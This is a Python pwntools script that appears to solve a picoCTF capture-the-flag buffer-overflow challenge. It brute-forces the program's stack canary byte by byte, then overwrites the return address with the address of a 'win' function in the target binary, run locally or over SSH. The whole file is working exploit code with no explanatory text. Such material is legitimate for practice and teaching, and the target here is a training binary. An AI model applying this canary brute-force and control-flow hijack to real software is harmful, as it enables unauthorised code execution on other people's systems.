#!/usr/bin/python
import struct
from pwn import *
debug = 1
user = 'XXXX'
pw = 'XXXX'
if not debug:
    s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
    s.set_working_directory('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf')
b32 = lambda x: struct.pack("I", x)
def findcookie():
    exp = "A"*32
    ans = ''
    for i in range(1, 5):
        c = ''
        byte = str(i + 32)
        for j in range(0, 255):
            c = chr(j)
            if debug:
                r = process('./vuln')
            else:
                r = s.process('./vuln')
            r.recvuntil('> ')
            r.sendline(byte)
            r.recvuntil('Input> ')
            cook = exp + ans + c
            r.sendline(cook)
            err = r.recvline()
            if 'Stack' in err:
                print "nop"
                r.close()
                continue
            else:
                ans += c
                print ans
                r.close()
                break

    return ans




if debug:
    r = process('./vuln')
else:
    r = s.process('./vuln')
vuln = ELF('./vuln')
win_func_addr = str(hex(vuln.symbols['win']))
win = int(win_func_addr, 16)
exploit = "A"*32
exploit += findcookie()
exploit += "B"*16
exploit += b32(win)
bytes = 56
print 'win address = ', win_func_addr

r.recvuntil('> ')
r.sendline('56')
r.recvuntil('Input> ')
r.sendline(exploit)
print r.recvall()

r.close()

